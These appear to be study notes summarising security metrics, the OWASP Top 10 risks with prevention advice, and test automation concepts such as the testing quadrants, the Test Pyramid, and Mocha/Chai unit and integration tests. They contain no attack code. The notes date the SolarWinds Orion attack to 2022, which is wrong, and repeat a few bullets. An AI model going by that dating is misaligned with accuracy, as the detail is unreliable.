				□ Care about strategic value: Is the cost of testing justified by its benefits?

				□ Want cost vs. value metrics (ROI of security activities).

				□ Need decision-making data: budget allocation, headcount, tools.

				□ Expect linkage to security maturity goals of the org.

			§ Managers

				□ Care about tactical execution and resources.

				□ Metrics should highlight resource allocation needs (e.g., % of code analyzed vs. unchecked).

				□ Strong interest in compliance with standards/policies (logging, 2FA, monitoring, etc.).

				□ Roll-up metrics → % of compliant applications across the portfolio.

			§ Developers

				□ Care about closing security gaps in code.

				□ Want granular, actionable metrics: which apps lack logging, monitoring, or protections.

				□ Need visibility into specific vulnerabilities (e.g., injection flaws).

				□ Practical references: OWASP cheat sheets.

			§ OWASP Resources for Metrics

				□ OWASP Security Qualitative Metrics Project:

					® 230 metrics across six categories: architecture, design/implementation, technologies, environment, code generation, dev methodologies, business logic.

				□ OWASP Application Security Guide for CISOs (archived):

					® 106-page PDF with recommended governance and risk-focused metrics.

					® Focus on process metrics, risk metrics, and SDLC security metrics.

			§ No One-Size-Fits-All

				□ Each organization must tailor metrics to context, maturity level, and audience.

				□ Best practice: Use OWASP resources + ASVS as a foundation, then customize.



#### Static Testing for the OWASP Top 10



The OWASP Top 10

	• The OWASP Top 10 is the foundational, globally recognized list of the most critical web application security risks, serving as the best starting point for building a manageable and effective application security testing program.

	• Rather than trying to implement every security measure at once (which can overwhelm teams), organizations should begin with the Top 10 and expand from there.

	• Key Concepts

		○ Start Simple: Walk, Then Run

			§ Avoid overloading teams with overly comprehensive security programs.

			§ Focus first on the OWASP Top 10 as a foundational baseline.

		○ OWASP Top 10

			§ Most mature and widely adopted OWASP project.

			§ Updated every 3 years.

			§ Released in English and translated globally.

			§ Integrated into many commercial and open-source web app security tools.

			§ Serves as the cornerstone of application security practices.

		○ Expansion Beyond Web Applications

			§ OWASP Mobile Application Security Project:

				□ Mobile apps introduce unique risks distinct from web apps.

				□ Includes:

					® Mobile Top 10 list

					® Mobile Application Security Testing Guide

					® Mobile Application Security Verification Standard

					® Mobile App Security Checklist

		○ Shifting Left with Proactive Security

			§ OWASP Proactive Controls Project:

				□ Aimed at developers.

				□ Helps prevent vulnerabilities upfront by embedding secure coding practices.

				□ Moves beyond reactive patching of discovered flaws.

		○ Keep It Manageable

			§ Begin with OWASP Top 10 for quick wins and early successes.

			§ Use additional resources (mobile project, proactive controls) once foundational practices are established.



A1: Broken Access Controls

	• Broken access control is the most significant risk in the OWASP Top 10. It occurs when authenticated users are able to perform actions or access data they should not have access to. Unlike some vulnerabilities, broken access control is difficult for automated tools to detect and requires strong design, frameworks, and manual testing to prevent and identify.

	• Key Concepts

		○ Definition \& Risk

			§ Occurs when applications fail to enforce proper user privileges after authentication.

			§ Occurs when applications fail to enforce proper user privileges after authentication.

			§ Users can access functions or data outside of their intended permissions (e.g., impersonating another user, escalating privileges).

			§ Impact ranges from data exposure to full system compromise.

		○ Challenges in Detection

			§ Automated tools can sometimes detect missing access controls, but they cannot fully understand business rules.

				□ Example: A scanner won’t know whether Dan in accounting should be allowed to reset passwords.

			§ Manual testing is essential to verify if access aligns with business rules.

		○ Access Management Framework

			§ Developers need a framework to guide who can access what.

			§ Without it, broken access flaws are likely to slip in.

			§ Role-Based Access Controls (RBAC) and access control matrices (mapping roles → pages, forms, buttons) are effective tools.

		○ Common Attack Scenarios

			§ Exploiting weak access control to:

				□ View or modify restricted data.

				□ Escalate privileges (e.g., gaining admin access).

				□ Abuse APIs (e.g., unauthorized PUT, POST, DELETE).

			§ Example: Tester manipulated user identifiers after login to impersonate other accounts, eventually escalating to admin.

		○ Prevention Strategies

			§ Default Deny: Start with no access and explicitly grant what’s necessary.

			§ RBAC: Use role-based access consistently.

			§ Reuse Mechanisms: Don’t reinvent; leverage tested frameworks or external directory services.

			§ APIs: Enforce strict HTTP method access control; add rate limiting.

			§ Server Configurations: Disable directory listing at the web server level.

		○ Monitoring \& Compliance

			§ Logging and monitoring are essential:

				□ Developers implement logging.

				□ Security teams monitor logs and respond.'

			§ Often required for compliance (e.g., PCI-DSS, HIPAA).

		○ Helpful OWASP Resources

			§ OWASP Proactive Controls → includes access management principles.

			§ OWASP Authorization Cheat Sheet → explains least privilege, deny by default, and permission validation.



A2: Cryptographic Failures

	• Cryptographic failures (formerly known as Sensitive Data Exposure) occur when applications fail to properly protect sensitive data through encryption, hashing, and secure transmission/storage. These flaws often lead to data breaches, compliance violations, and reputational damage.

	• Key Concepts

		○ Why Cryptographic Failures Matter

			§ Attackers target sensitive data (credentials, financial info, healthcare data).

			§ Gaps in encryption allow theft without exploiting other vulnerabilities like injection or access control.

			§ Worst-case scenario = data breach → financial loss, fines, reputational harm.

		○ Common Weaknesses

			§ Unencrypted data in transit (e.g., using HTTP instead of HTTPS).

			§ Unencrypted data at rest (e.g., passwords stored in plaintext).

			§ Weak/poorly implemented encryption (homegrown algorithms, outdated ciphers).

			§ Improper use of hashing or encoding (confusing encoding with encryption).

			§ Improper key lifecycle management (keys hardcoded, not rotated, or poorly protected).

		○ Encryption vs. Hashing vs. Encoding

			§ Encryption: reversible with a key.

			§ Hashing: one-way; only comparison possible (should be salted for passwords).

			§ Encoding: reversible without keys (e.g., Base64, Hex, ASCII) → not secure.

		○ Risks \& Compliance Implications

			§ Laws with fines for PII/EPHI exposure: GDPR, CCPA, PIPEDA, HIPAA.

			§ Sensitive data definition must come from the organization’s data classification policy.

			§ Example: even a simple policy like “Credit card data must be encrypted” is a good start.

		○ Testing \& Validation

			§ Use data flow diagrams (DFDs) to track how sensitive data moves:

				□ Entry points

				□ Storage (databases, backups)

				□ Transmission (internal/external apps)

			§ Highlight unencrypted storage or transfers.

			§ Check for use of weak or outdated algorithms.

			§ Flag “custom encryption” immediately as a finding.

		○ Best Practices

			§ Encrypt everything (at rest + in transit).

			§ Avoid unnecessary storage/transmission of sensitive data.

			§ Do not assume internal networks are safe — attackers thrive there.

			§ Disable caching of sensitive data.

			§ Use salted hashing for password storage.

			§ Follow OWASP cheat sheets:

				□ Transport Layer Protection

				□ Password Storage

				□ Cryptographic Storage

				□ User Privacy Protection

		○ OWASP Proactive Controls (Control 8)

			§ Classify data.

			§ Encrypt at rest and in transit.

			§ Define processes for:

				□ Key lifecycle management.

				□ Secrets management.



A3: Injection

	• Injection flaws occur when untrusted input is sent to a backend interpreter (SQL, LDAP, OS command, etc.), allowing attackers to manipulate the interpreter into executing unintended commands. They remain one of the most severe and persistent risks in application security.

	• Key Concepts

		○ What Injection Is

			§ Occurs when untrusted data is sent to an interpreter (SQL, LDAP, OS commands, etc.).

			§ Interpreters execute commands without deciding what is “safe.”

			§ Attackers exploit any input that interacts with an interpreter.

		○ Common Attack Vectors

			§ Application parameters, environment variables, web services, and user input.

			§ Examples: login forms, search fields, JSON messages.

			§ Attackers often use escape characters to alter how interpreters read input.

		○ Potential Impacts

			§ Bypass authentication (e.g., SQL injection in login).

			§ Extract or manipulate sensitive data (dump entire databases).

			§ Remote code execution by sending OS-level commands.

			§ Full server takeover.

			§ Business impact: data breaches, service compromise, brand/reputation damage.

		○ Detection Methods

			§ Source code reviews are most effective.

			§ Look for:

				□ Raw SQL queries.

				□ LDAP queries (Active Directory, OpenLDAP).

				□ OS command calls.

				□ Object Relational Mapping (ORM) API calls (which can hide SQL logic).

			§ Collaboration with developers saves time and clarifies ORM/API use.

		○ Prevention Strategies

			§ Safe APIs \& ORM tools: use well-tested libraries instead of hand-coded queries.

			§ Whitelisting input validation: only allow known good values (works for limited sets like postal codes).

			§ Input encoding/sanitization: encode dangerous characters before passing to interpreter.

			§ Parameterized queries/prepared statements: avoid dynamic query building.

			§ Escape characters: if dynamic queries are unavoidable, build in safe escaping mechanisms.

			§ Native controls: use SQL features like LIMIT to minimize data exposure.

			§ Defense-in-depth: combine validation, encoding, and least-privilege query design.

		○ Resources for Developers \& Testers

			§ OWASP Injection Prevention Cheat Sheet: code examples + best practices.

			§ Bobby Tables (xkcd-inspired guide): language-specific guidance for preventing SQL injection.



A4: Insecure Design

	• Insecure design flaws occur when applications are built without security considerations from the start. Unlike implementation bugs that can be patched later, insecure design flaws are baked into the architecture and are much harder and costlier to fix after deployment. Security must be incorporated early in the software development life cycle (SDLC), ideally before any code is written.

	• Key Concepts

		○ Nature of Insecure Design

			§ Design flaws vs. implementation flaws:

				□ Design flaws = security missing at the architecture level.

				□ Implementation flaws = coding mistakes.

			§ Secure design can mitigate implementation issues, but secure implementation cannot fix insecure design.

		○ Why It Happens

			§ Lack of security-focused culture in development.

			§ Misunderstanding of business risks (e.g., GDPR privacy requirements).

			§ Missing or undocumented SDLC processes.

			§ User stories focusing only on functionality, without security requirements.

			§ Relying on hope instead of strategy (“Hope is not a strategy”).

		○ Business Impact

			§ Applications may violate compliance (e.g., GDPR fines).

			§ More costly to remediate insecure design after deployment.

			§ Poor design can leave systems exposed even if implementation is perfect.

		○ Indicators of Insecure Design

			§ No documented development processes or SDLC.

			§ Absence of security-related user stories.

			§ No security testing tools in CI/CD pipelines.

			§ Lack of SBOM (Software Bill of Materials) to track dependencies.

		○ Strategies for Detection \& Prevention

			§ Documentation review (SDLC, SBOM, test cases).

			§ Threat modeling: simulate attacker behavior to identify weak points.

			§ Reference architectures: adopt secure-by-design templates from AWS, Azure, GCP.

			§ Secure design patterns: write down and enforce practices (e.g., never put user IDs in URLs).

			§ Misuse/abuse cases: define and test against malicious scenarios.

			§ Security testing tools integrated into pipelines.

		○ Maturity Models for Secure Design

			§ OWASP SAMM (Software Assurance Maturity Model).

			§ BSIMM (Building Security In Maturity Model) by Synopsys.

			§ Both help organizations measure and improve secure design practices over time.



A5: Security Misconfiguration

	• Security misconfiguration occurs when applications, servers, or infrastructure are deployed with insecure, default, or poorly maintained configurations. These flaws can expose sensitive information, enable unauthorized access, and even lead to full system compromise. Preventing misconfiguration requires hardening standards, patching, monitoring, and change control discipline across the entire application stack.

	• Key Concepts

		○ Definition \& Scope

			§ Security misconfiguration = insecure defaults, incomplete configurations, or failure to maintain updates.

			§ It’s not just coding; it’s about secure deployment and ongoing maintenance.

			§ Applies to OS, frameworks, libraries, cloud services, and app infrastructure.

		○ Common Examples

			§ Open cloud storage with weak access controls.

			§ Verbose error messages exposing stack traces, web server details, or internal network info.

			§ Unpatched components with known vulnerabilities (apps, OS, libraries, frameworks).

			§ Default installation artifacts like README files, sample apps, status pages.

			§ World-readable config files with credentials (e.g., phpinfo() exposing MySQL backend).

			§ Old/unused libraries or features left enabled.

			§ Misconfigured account lockouts (e.g., allowing 10,000 failed logins).

		○ Causes

			§ Lack of hardening standards for infrastructure components.

			§ Infrastructure changes (new OS/web server deployments reintroducing defaults).

			§ Application changes (new libraries/frameworks introducing new configs).

			§ Neglected patching – new vulnerabilities emerge daily, with exploits appearing within hours of disclosure.

		○ Impact

			§ Can range from minor information disclosure to complete system compromise.

			§ Attackers actively look for overlooked or default configurations.

			§ Misconfigured storage or config files can lead to data breaches.

		○ Best Practices for Prevention

			§ Documented, repeatable hardening standards for every component.

			§ Apply patches and updates quickly (time-to-exploit is very short).

			§ Remove unnecessary features, services, and components.

			§ Carefully review config files line by line (not just presence of settings, but appropriateness).

			§ Deny-all-first approach to access control (esp. cloud storage).

			§ Segmentation and containerization to limit blast radius of misconfigs.

			§ Logging and monitoring in place and validated (produce logs on demand for IR).

		○ Guidance \& References

			§ CIS Benchmarks: trusted hardening guides for OS, servers, cloud services.

			§ Lenny Zeltser’s Critical Log Review Checklist (zeltser.com): excellent practical resource for security logging.



A6: Vulnerable an Outdated Components

	• Applications often rely on third-party components (libraries, frameworks, modules), which can introduce critical vulnerabilities if not kept up-to-date. Unlike misconfigurations, these flaws cannot be fixed by tuning settings—you must patch, upgrade, or remove the vulnerable component. Managing these risks requires visibility, monitoring, and a disciplined maintenance process.

	• Key Concepts

		○ Difference from Misconfigurations

			§ Misconfigurations = security settings that can be adjusted to match risk appetite.

			§ Outdated components = known vulnerabilities in the component itself; no config change can fix it.

		○ Business Impact

			§ Fixing/upgrading a component can be costly and disruptive.

			§ Organizations may be forced to “ride out the storm” when critical frameworks are vulnerable (e.g., Drupalgeddon, Log4Shell).

			§ Risk severity depends on both technical impact and business context.

		○ Complexity \& Visibility

			§ Applications become ecosystems of custom code + third-party libraries.

			§ Without an inventory (SBOM – Software Bill of Materials), it’s hard to know if your app is vulnerable.

		○ Developer Practices \& Risks

			§ Developers often include third-party libraries for speed without knowing their security posture.

			§ If dev teams avoid upgrades to prevent breaking changes, risk of outdated vulnerable components increases.

			§ Secure configuration files of these components must also be validated.

		○ Best Practices to Mitigate Risks

			§ Remove unnecessary components (streamlining reduces both risk and operational overhead).

			§ Build and maintain an SBOM (name, version, source, use case).

			§ Use only trusted, digitally signed components from reliable sources.

			§ Establish a monitoring process for component updates and support activity.

			§ Watch for abandoned/dormant open-source projects (no patches = higher risk).

		○ Tools \& Resources

			§ OWASP Dependency-Check: software composition analysis tool for Java \& .NET (CLI, build plugins, Jenkins, SonarQube, etc.).

			§ CVE Database (MITRE): searchable repository of known vulnerabilities.

			§ Other integrations (e.g., SonarQube) can extend visibility.



A7: Identification and Authentication

	• Identification and authentication failures occur when applications have weak or poorly implemented login, password, and session management mechanisms. These failures allow attackers to bypass authentication, reuse stolen credentials, exploit default/weak passwords, or hijack sessions. The result can range from minor privacy violations to severe breaches, depending on the sensitivity of the application and data.

	• Key Concepts

		○ Sources of Risk

			§ Stolen credentials: Many usernames/passwords are available on the dark web.

			§ Default credentials: Often left unchanged in older tech or admin interfaces.

			§ Brute force attacks: Automated tools testing multiple combinations.

			§ Session hijacking: Reuse of unexpired session tokens.

		○ Causes

			§ Lack of secure Identity \& Access Management (IAM) planning early in development.

			§ Weak or absent session management controls.

			§ Poor password policy or failure to block compromised/weak passwords.

			§ Inadequate account lockout mechanisms.

			§ Weak password reset mechanisms (exploitable security questions).

			§ Storing passwords improperly (plaintext is worst, hashing is best).

		○ Questions to Ask Early in Development

			§ How strong do passwords need to be?

			§ Will passwordless or MFA be required?

			§ Are default/weak passwords prohibited?

			§ What are session expiration and lockout policies?

			§ Can multiple concurrent logins from different devices be restricted?

		○ Impacts

			§ Minor: Privacy issues (e.g., library account exposing borrowing history).

			§ Severe:

				□ Banking apps → financial theft.

				□ Infrastructure admin apps → takeover or disruption of critical systems.

		○ Best Practices

			§ Password security:

				□ Strong complexity requirements.

				□ Prohibit known compromised passwords.

				□ Use hashing for storage.

			§ MFA (multifactor authentication): Strong defense even if credentials are stolen.

			§ Session management:

				□ Server-side enforcement preferred.

				□ Proper session ID handling (avoid URL-based IDs).

			§ Account lockouts: Based on failed login attempts and/or IP-level

			§ Thoughtful password reset: Avoid guessable recovery questions.

		○ OWASP Guidance

			§ Cheat Sheets available for:

				□ Authentication

				□ Credential stuffing prevention

				□ Password resets

				□ Session management

			§ OWASP Proactive Controls (C6) \& NIST guidance:

				□ Level 1: Passwords

				□ Level 2: MFA

				□ Level 3: Cryptographic-based authentication



A8: Software and Data Integrity

	• Software and data integrity failures occur when trust in software components, data, or infrastructure is misplaced, leading to potential exploitation. These risks emphasize the need for validation, strong CI/CD controls, secure SDLC practices, and vigilance against supply chain attacks.

	• Key Concepts

		○ Definition \& Scope

			§ Based on assumed trust in:

				□ Data inputs.

				□ Software components and updates.

				□ Infrastructure elements.

			§ If trust is misplaced → security incidents or breaches.

		○ Evolution from Insecure Deserialization

			§ 2017’s “Insecure Deserialization” evolved into broader software/data integrity risks.

			§ Both relate to vulnerabilities where untrusted or manipulated code/data compromises security.

		○ Update \& Supply Chain Risks

			§ Application integrity can be compromised during:

				□ Automatic or manual updates.

				□ Pulling libraries from external repositories.

			§ Example: Python PyPI ransomware incident (2022) — malicious library downloaded hundreds of times.

			§ Example: SolarWinds Orion attack (2022) — malicious update affected 30,000+ organizations.

		○ CI/CD Pipeline Threats

			§ Pipelines can be a point of failure:

				□ Unrestricted/unaudited changes.

				□ Weak access control.

				□ Misconfigurations.

			§ Malicious code can slip into production if CI/CD trust is broken.

		○ Mitigation Strategies

			§ Digital Signature Validation

				□ Integrate signature checks into code and updates.

				□ Validate libraries and third-party components.

			§ SBOM (Software Bill of Materials)

				□ Inventory of all components, dependencies, and libraries.

				□ Starting point for signature validation and vulnerability scanning.

			§ Secure SDLC Practices

				□ Strong code reviews to detect untrusted code.

				□ Change control to prevent insecure deployments.

			§ Controlled Dependency Management

				□ Vet libraries → publish to internal trusted repo.

				□ Allow developers to pull only from controlled sources.

		○ Supporting Tools (OWASP Projects)

			§ CycloneDX

				□ BOM standard (software, SaaS, ops, manufacturing).

				□ Supports vulnerability advisory format.

				□ Offers 200+ automation tools.

			§ Dependency-Check

				□ Software composition analysis (SCA).

				□ Identifies libraries and checks against vulnerability databases.



A9: Security Logging and Monitoring Failures

	• Security logging and monitoring failures occur when applications lack proper logging, monitoring, and alerting mechanisms. Without these, attackers can operate undetected, increasing the risk of data breaches, system takeovers, and costly outages. Strong logging and monitoring—combined with centralization, real-time alerting, and secure storage—are essential to detect, respond to, and contain attacks early.

	• Key Concepts

		○ Why Failures Happen

			§ Developers often prioritize functionality and go-live deadlines over security logging.

			§ Lack of security training and awareness in development teams.

			§ Absence of logging/monitoring policies, standards, and documentation.

			§ Logging is often implemented only for troubleshooting, not for security.

		○ Risk Progression During Attacks

			§ Reconnaissance phase: attackers scan and probe apps. If caught here → minimal damage.

			§ Exploitation phase: attacks like SQL injection or brute force attempts. If detected here → partial damage but containable.

			§ Compromise phase: full breach/system takeover if logging fails. Very costly.

		○ Building Logging \& Monitoring (Pyramid Approach)

			§ Foundation: Ensure auditable events are being logged.

			§ Log Content: Logs must have enough detail to explain what happened.

			§ Monitoring: Logs must be actively reviewed; alerts should be near real-time.

			§ Storage: Logs should be centralized and protected, not stored locally where attackers can tamper with them.

			§ Integrity Controls: Ensure logs cannot be altered or deleted without detection.

		○ High-Value Targets for Logging

			§ Login activity (both successes and failures).

			§ Access control failures.

			§ Input validation failures.

These are often strong indicators of malicious behavior.

		○ Best Practices

			§ Centralize logs to internal servers for correlation and protection.

			§ Enable real-time alerts for suspicious activity.

			§ Apply integrity controls to detect tampering or log removal.

			§ Ensure timely review of logs and alerts by the security team.

		○ Resources for Guidance

			§ OWASP Cheat Sheets (logging, monitoring, misconfiguration).

			§ NIST SP 800-61 Rev. 2: Computer Security Incident Handling Guide.

			§ ICS 500-27: Intelligence Community standard for audit data collection and sharing.



A10: Server-Side Request Forgery

	• Server-Side Request Forgery (SSRF) occurs when an application allows attackers to make unauthorized requests from the server to internal or external systems. This can expose sensitive files, internal services, or cloud resources, and potentially allow attackers to execute malicious code or cause denial of service. SSRF is a growing risk, especially with cloud adoption, and requires strong validation, segmentation, and preventive controls.

	• Key Concepts

		○ What SSRF Is

			§ Attackers trick a server into making requests it shouldn’t (e.g., to internal services, local files, or attacker-controlled endpoints).

			§ Differs from command injection: SSRF is about forcing requests, not directly executing commands.

			§ Often arises when applications blindly trust user-supplied URLs.

		○ What Attackers Can Do with SSRF

			§ Access sensitive local files (e.g., /etc/passwd on Linux)

			§ Map the internal network (hostnames, IPs, open ports).

			§ Force internal systems to connect to attacker-controlled URLs.

			§ Trigger malicious code execution on internal servers.

			§ Cause denial of service conditions.

			§ Exploit cloud misconfigurations (e.g., overexposed S3 buckets, cloud metadata services).

		○ Detection \& Testing

			§ Look for URL validation weaknesses (does the app trust all URLs blindly?).

			§ Review application architecture for segmentation — is the app isolated from sensitive resources?

			§ Test for unexpected protocols (not just HTTP — e.g., file://, gopher://, ftp://).

		○ Preventive Controls

			§ Input validation \& sanitization of user-supplied URLs.

			§ Disallow or restrict HTTP redirects, which can be abused for SSRF.

			§ Network segmentation: restrict servers to only necessary outbound ports/services.

			§ Cloud configuration standards: enforce least privilege and restrict access to cloud metadata/storage.

			§ Allow lists (preferred over deny lists): explicitly define “known good” destinations.

			§ Logging \& monitoring of abnormal outbound requests.

		○ Resources

			§ OWASP SSRF Prevention Cheat Sheet: practical developer-focused examples and controls.

			§ “SSRF Bible” (Wallarm Research Team): detailed 23-page guide expanding on OWASP guidance.





---------------------------------------------------------------------------------------------------------------------------------------------------------------------------

### Test Automation

#### Test Types



Agile Testing Quadrants

	• The Agile Testing Quadrants, created by Brian Marick in 2003, provide a framework to classify different types of tests in Agile development. The quadrants help teams decide which tests to automate, when to run them, and what resources are needed. The model organizes tests along two axes:

		○ Business-facing vs. Technology-facing

		○ Guides development vs. Critiques the product

	• Key Concepts



		○ The Four Quadrants

			§ Quadrant 1 (Bottom-left)

				• Technology-facing, guides development

				• Always automated

				• Ensures code quality foundation and confirms functionality while coding

				• Examples: Unit tests, integration tests, component tests

				• Written during development and run frequently

			§ Quadrant 2 (Top-left)

				• Business-facing, guides development

				• Automated or manual

				• Helps validate features and confirm business requirements

				• Examples: Functional tests, UI tests, prototypes, mockups

				• Often part of the Definition of Done for a user story

			§ Quadrant 3 (Top-right)

				• Business-facing, critiques the product

				• Mostly manual (can have automation support)

				• Provides feedback on user experience and workflows

				• Requires critical thinking and observation

				• Examples: Exploratory testing, usability testing, A/B testing

			§ Quadrant 4 (Bottom-right)

				• Technology-facing, critiques the product

				• Automated and tool-driven

				• Provides targeted data about performance and reliability

				• Examples: Performance testing, load testing, security testing, reliability testing (anything ending in “-ility”)

				• Performed based on system priorities

		○ Guiding Principles

			§ The quadrants are not sequential (numbers don’t imply order).

			§ Teams don’t need tests in every quadrant — testing strategy depends on context and priorities.

			§ The model ensures balanced coverage of both business value and technical quality.

			§ Helps teams continuously think about what tests matter most during planning, development, and releases.



The Test Pyramid

	• The Test Pyramid, introduced by Mike Cohn in Succeeding with Agile (2009), is a model that illustrates the ideal balance of automated tests in a project. It shows how many tests should exist at each level (unit, integration, UI) to achieve a fast, reliable, and maintainable test suite.

	• Key Concepts

		○ Structure of the Pyramid

			§ Unit Tests (Base)

				□ Fastest, most isolated tests (milliseconds)

				□ Test single functions with mocked or stubbed data

				□ Form the largest portion of the test suite

				□ Ensure correctness of individual pieces of code

			§ Integration Tests (Middle)

				□ Service-level tests, slower than unit but faster than UI (10–100 ms)

				□ Validate multiple services working together (DB, file systems, APIs)

				□ Generate their own data

				□ Ensure smooth communication and system integrity

			§ UI Tests (Top)

				□ End-to-end workflows, simulate real user actions (clicking, typing)

				□ Run through a browser (seconds to minutes per test)

				□ Very valuable for user perspective, but slow and costly to maintain

				□ Should be kept to a small number, covering primary workflows

		○ Why the Pyramid Shape Matters

			§ Bottom-heavy is ideal → fast, cheap tests at scale with fewer but valuable top-level UI tests.

			§ Anti-patterns:

				□ Square shape → too many unit tests only, gaps in coverage for workflows.

				□ Inverted pyramid → too many UI tests, slow feedback, hard maintenance.

			§ The pyramid promotes test efficiency, speed, and reliability.

		○ Flexibility of the Model

			§ Not limited to just 3 levels — can include additional test types (e.g., performance, security).

			§ Each team’s pyramid may look different depending on project needs.

			§ The goal is to be intentional about the test strategy and understand the trade-offs of different “shapes.”







Unit Test

	• Unit tests are the foundation of automated testing and are critical for ensuring that application functionality works correctly. They should be fast, simple, and focused on testing one thing at a time. The transcript illustrates this with a practical example of writing and running unit tests for a middleware function in a Node.js/Express application.

	• Key Concepts

		○ The Example Application

			§ AI Animal Art Store (fictional):

				□ Built with Node.js and Express

				□ Features include: browsing art, adding items to cart, viewing/updating cart, and checkout

				□ Uses a SQL database with two tables: items (products) and cart (cart items/quantities)

				□ Middleware handles logic such as calculating total price, error handling, validating input, logging requests

		○ Unit Testing Principles

			§ Purpose: Validate small, isolated pieces of functionality (e.g., a middleware function).

			§ Characteristics:

				□ Fast (milliseconds)

				□ Simple

				□ Test only one thing at a time

		○ Testing Frameworks and Tools

			§ Mocha → testing framework (supports BDD-style tests).

			§ Chai → assertion library (verifies expected outcomes).

			§ Sinon → mocks and stubs dependencies (fakes objects/data to isolate tests).

		○ Practical Example: Testing calculateTotalPrice Middleware

			§ Setup:

				□ Import the middleware under test

				□ Mock req (request) object with items and quantities

				□ Mock res object (empty)

				□ Use sinon.spy() to track the next() call

			§ Tests Written:

				□ Should calculate total price → verifies correct calculation of item totals.

				□ Should handle empty cart → ensures total is 0 when req.items is empty.

				□ Should handle missing quantities → ensures total is 0 if no quantity exists for an item.

			§ Execution:

				□ un with npx mocha test/unit/calculateTotalPrice.test.js

				□ Output shows all tests passing in ~6ms.



Integration Test

	• Integration tests validate that different parts of an application work together seamlessly. Unlike unit tests (which test small, isolated pieces), integration tests focus on cross-module processes and end-to-end flows. They give confidence that the system behaves correctly when multiple components interact.

	• Key Concepts

		○ Purpose of Integration Tests

			§ Ensure whole-system functionality, not just isolated parts.

			§ Detect failures caused by interactions between modules.

			§ Cover cross-module processes that can’t be validated with unit tests.

			§ Useful when some parts of code are not unit-testable in isolation.

		○ Example: AI Animal Art Application

			§ Frameworks \& Tools Used:

				• Mocha → test framework (BDD style)

				• Supertest → simulate HTTP requests

				• Chai → assertions

				• SQLite (in-memory) → isolated test DB (avoids affecting production data)

			§ Test File: routes.test.js

				• Before Hook → creates items and cart tables, inserts initial data

				• After Hook → drops tables to clean up after test

		○ Integration Tests Implemented

			§ Add to Cart (POST request)

				• Simulates adding item with ID 1

				• Verifies response status, redirect URL, and database insertion

			§ Display Cart Page (GET request)

				• Inserts item with ID 1, quantity 2

				• Simulates request to /cart

				• Verifies status and that the cart page includes item name

			§ Checkout Page (GET request)

				• Inserts item with ID 1, quantity 2

				• Simulates request to /checkout

				• Verifies status and presence of message "Thanks for your order."

		○ Performance \& Characteristics

			§ Still fast (55ms), but slower than unit tests (6ms) because:

				• Requires DB queries

				• Simulates HTTP requests

				• Waits for responses

			§ Provides broader system confidence at a higher cost compared to unit tests.



UI Test

	• UI tests (also called end-to-end or functional tests) validate complete application workflows by simulating real user interactions in a browser. They ensure the frontend UI, backend systems, and databases all work together correctly. While extremely valuable, they are slower, harder to set up, and more resource-intensive compared to unit and integration tests.

	• Key Concepts

		○ Role of UI Tests

			§ Complement lower-level tests (unit, integration) by covering gaps.

			§ Provide a user’s perspective on whether the application works as expected.

			§ Simulate real-world workflows → e.g., add to cart → checkout.

			§ Act as a form of integration testing, since they exercise the full system stack.

		○ Technical Characteristics

			§ Always run in a browser (Chrome, Firefox, etc.).

			§ Require specific browser versions and environments (harder setup).

			§ Slower execution due to many moving parts: launching browser, rendering UI, simulating clicks, waiting for responses.

				• Unit test: ~5ms

				• Integration test: ~50ms

				• UI test: ~624ms (~1s)



#### How to Approach Automation



Get the Whole Team Involved

	• For test automation to succeed in a software delivery project, it must be a shared responsibility across the entire team—not just testers. Developers, testers, and business stakeholders (like product managers and business analysts) all play essential roles in planning, executing, and maintaining an effective, valuable automation strategy.

	• Key Concepts

		○ Team Involvement

			§ Whole team participation: developers, testers, product managers, and business analysts.

			§ Collaboration ensures that test automation reflects both technical needs and business priorities.

			§ Creates shared accountability → quality is everyone’s responsibility.

		○ Planning and Strategy

			§ Begin with a shared big picture → align expectations across roles.

			§ Hold cross-functional brainstorming sessions to define what makes a “good test suite.”

			§ Use models like the Agile Testing Quadrants and the Test Pyramid to structure discussions about:

				• Types of tests needed

				• Test tools to be used

				• Ownership of different test levels

			§ Ownership of Tests

				• Unit tests → typically owned by developers (written during development).

				• Integration tests → often shared between developers and testers.

				• UI tests → usually owned by testers.

				• Ownership isn’t exclusive—team members can and should help each other.

			§ Ongoing Collaboration

				• Hold retrospectives every few months to reflect on what’s working, what needs improvement.

				• Encourage knowledge-sharing and cross-support:

					® Stakeholders help identify high-priority scenarios.

					® Stakeholders help identify high-priority scenarios.

					® Testers help developers with edge cases.

					® Developers assist testers in writing UI scripts.

					® Testers and developers report results back to stakeholders.

		○ Sustainability \& Evolution

			§ Test automation is an ongoing process—new tests will always be added, and old ones may need maintenance.

			§ Teams should work to keep the suite lean, valuable, and maintainable.

			§ A teamwide investment in automation leads to a robust and reliable test suite.

			



Make a Strategy

	• Before writing tests, teams should plan and document a clear testing strategy. This involves identifying priority features, deciding what to automate versus keep manual, defining the scope of test types, and determining the resources and environments required. A strategy ensures test automation is efficient, maintainable, and aligned with business priorities.

	• Key Concepts

		○ Prioritize Features

			§ Start with business stakeholders → they provide the list of highest priority features.

			§ Align testing with business value and critical functionality.

		○ Decide What to Automate vs. Manual

			§ Good candidates for automation:

				• High-impact features

				• Tedious, repetitive tasks

				• Scenarios with predictable, consistent results

			§ Manual testing is better for exploratory, usability, or one-off checks.

		○ Apply the Test Pyramid

			§ Push automation to the lowest level possible:

				• Unit tests → largest number, fastest feedback

				• Integration tests → moderate number

				• UI tests → fewest, only for critical workflows

			§ If a scenario can be validated without the UI, avoid UI automation to reduce complexity and execution time.

		○ Define Test Suite Scope Early

			§ Decide which test types (unit, integration, UI, others like performance/security) will be included.

			§ Define scope early, but remain flexible for changes later in the project.

		○ Plan Resources

			§ Consider what’s needed for test automation success:

				• Test data → how it will be used, created, managed

				• Tooling → frameworks and libraries for building/running tests

				• Test environments → availability for both automated and manual testing

			§ Make a list of resources required to support testing efforts.

		○ Document the Testing Strategy

			§ Captures decisions, scope, and resources.

			§ Serves as guidance for current and future teammates.

			§ Provides a consistent approach for planning, executing, and maintaining automation.



Test Tools

	• Choosing the right test tools should follow test strategy decisions, not precede them. Teams should first define how they want tests to be structured, then evaluate and experiment with tools that best fit their needs. The process should be collaborative, criteria-based, and iterative, leading to better collaboration and more effective test automation.

	• Key Concepts

		○ Tools Come After Strategy

			§ Don’t pick tools too early — first decide:

				• What types of tests (unit, integration, UI, etc.) will be automated.

				• How tests will be expressed (style, frameworks, BDD vs TDD, etc.).

			§ Avoid limiting options by prematurely locking into a toolset.

		○ Baseline Requirements

			§ Two baseline criteria for selecting tools:

				• Type of test to implement (unit, integration, UI, performance, etc.).

				• Programming language in which the tests will be written.

			§ Example: choosing a JavaScript unit testing framework if the project code is JS.

